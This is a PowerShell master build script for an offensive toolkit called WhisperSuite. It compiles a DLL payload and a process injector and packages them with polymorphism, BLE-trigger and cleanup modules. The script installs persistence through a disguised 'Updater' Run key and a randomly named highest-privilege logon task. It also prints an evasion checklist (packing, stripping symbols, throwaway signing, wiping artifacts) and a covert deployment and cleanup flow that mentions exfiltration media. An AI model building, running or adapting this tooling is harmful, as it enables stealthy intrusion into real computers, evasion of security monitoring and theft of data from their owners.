# BuildDeployWhisper.ps1
# Master build + deployment script for WhisperSuite: GhostWhisper Edition
# Includes compilation, polymorphism, persistence, BLE trigger, wormhole, and virtualization

$baseDir = "$PSScriptRoot"
$finalPackage = "$baseDir\WhisperSuite_Build"

# === Core Binaries ===
$ghostKeyDLL = "$baseDir\GhostKey\bin\Release\GhostKey.dll"
$injectorEXE = "$baseDir\WraithTap\x64\Release\WraithTap.exe"
$dropperEXE = "$baseDir\Dropper_with_Raven.exe"
$cleanerPS1 = "$baseDir\SilentBloom.ps1"
$bleTriggerScript = "$baseDir\BLETrigger.ps1"
$polymorphScript = "$baseDir\GhostPolymorph.ps1"
$bleConnectScript = "$baseDir\GhostBLEConnect_v2.ps1"
$bootstrapScript = "$baseDir\GhostWhisperBootstrap.ps1"

# === Modules ===
$modulePaths = @(
    "Modules\GhostLogger.ps1",
    "Modules\AnomalyHunter.ps1",
    "Modules\Anomaly_Detector.ps1",
    "Modules\Wormhole.ps1",
    "Modules\LinuxPDF_Emu.ps1",
    "Modules\LinuxPDF_Runtime.ps1",
    "Modules\Phase_Anoint.ps1",
    "Modules\Phase_Bind.ps1",
    "Modules\Phase_Cleanse.ps1",
    "Modules\GhostResidency.ps1",
    "Modules\GhostSeal.ps1",
    "Modules\ExorcistMode.ps1"
)

function Compile-Projects {
    Write-Host "[*] Compiling C# GhostKey DLL..."
    msbuild "$baseDir\GhostKey\GhostKey.csproj" /p:Configuration=Release | Out-Null

    Write-Host "[*] Compiling C++ WraithTap Injector..."
    msbuild "$baseDir\WraithTap\WraithTap.vcxproj" /p:Configuration=Release /p:Platform=x64 | Out-Null
}

function Embed-RavenPoem {
    Write-Host "[*] Embedding Raven's poem into injector..."
    & $dropperEXE $injectorEXE
}

function Prepare-Package {
    Write-Host "[*] Packaging WhisperSuite build..."
    New-Item -ItemType Directory -Path $finalPackage -Force | Out-Null
    New-Item -ItemType Directory -Path "$finalPackage\Modules" -Force | Out-Null

    # Core components
    Copy-Item $injectorEXE "$finalPackage\WraithTap.exe" -Force
    Copy-Item $ghostKeyDLL "$finalPackage\GhostKey.dll" -Force
    Copy-Item $cleanerPS1 "$finalPackage\SilentBloom.ps1" -Force
    Copy-Item $bleTriggerScript "$finalPackage\BLETrigger.ps1" -Force
    Copy-Item $polymorphScript "$finalPackage\GhostPolymorph.ps1" -Force
    Copy-Item $bleConnectScript "$finalPackage\GhostBLEConnect_v2.ps1" -Force
    Copy-Item $bootstrapScript "$finalPackage\GhostWhisperBootstrap.ps1" -Force

    # Modules
    foreach ($mod in $modulePaths) {
        if (Test-Path "$baseDir\$mod") {
            Copy-Item "$baseDir\$mod" "$finalPackage\$mod" -Force
        } else {
            Write-Warning "[!] Missing module: $mod"
        }
    }

    # Tribute note
    $note = @"
This toolkit is a ghost in motion.
It exists for those who are unseen.
And for one who is gone, but not forgotten.

—R
"@
    Set-Content -Path "$finalPackage\note.txt" -Value $note

    Write-Host "[✓] WhisperSuite is ready: $finalPackage"
}

function Setup-Persistence {
    Write-Host "[*] Creating registry and scheduled task persistence..."

    $payloadPath = "C:\\Windows\\System32\\GhostKey.dll"
    $injectorPath = "C:\\Windows\\System32\\WraithTap.exe"
    $execCommand = "$injectorPath $payloadPath"

    try {
        Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value $execCommand -Force
        Write-Host "[+] Registry persistence set (HKCU Run key)."
    } catch {
        Write-Warning "[-] Failed to create registry key: $_"
    }

    try {
        $taskName = "WinSvc_" + -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
        schtasks /create /tn $taskName /tr "\"$injectorPath\" \"$payloadPath\"" /sc onlogon /rl highest /f | Out-Null
        Write-Host "[+] Scheduled task created ($taskName)."
    } catch {
        Write-Warning "[-] Failed to create scheduled task: $_"
    }
}

function Deploy-BLETrigger {
    Write-Host "[*] Creating BLE trigger script with encrypted handshake and EDR evasion..."
    $bleScript = Get-Content "$baseDir\Templates\BLETrigger_Encrypted.ps1" -Raw
    Set-Content -Path $bleTriggerScript -Value $bleScript
    Write-Host "[+] BLE trigger deployed."
}

function Show-Obfuscation-Checklist {
    Write-Host "`n===== OBFUSCATION CHECKLIST ====="
    Write-Host "[1] Run GhostKey.dll through ConfuserEx or Dotfuscator"
    Write-Host "[2] Strip symbols from WraithTap.exe (/DEBUG:NONE)"
    Write-Host "[3] Use UPX or similar packer for WraithTap"
    Write-Host "[4] Randomize filenames or strings for each deployment"
    Write-Host "[5] Wipe build artifacts with cipher /w or sdelete"
    Write-Host "[6] Optionally sign with throwaway certificate"
}

function Show-Deployment-Flow {
    Write-Host "`n===== DEPLOYMENT FLOW ====="
    Write-Host "[1] Transfer WhisperSuite_Build to secure device (USB, Flipper, etc)"
    Write-Host "[2] Use GhostWhisperBootstrap.ps1 to engage modules"
    Write-Host "[3] Trigger via BLETrigger.ps1 or WraithTap.exe GhostKey.dll"
    Write-Host "[4] Run SilentBloom.ps1 post-op for cleanup"
    Write-Host "[5] Securely shred or format exfiltration media"
}

# === EXECUTION ===
Compile-Projects
Embed-RavenPoem
Prepare-Package
Setup-Persistence
Deploy-BLETrigger
Show-Obfuscation-Checklist
Show-Deployment-Flow
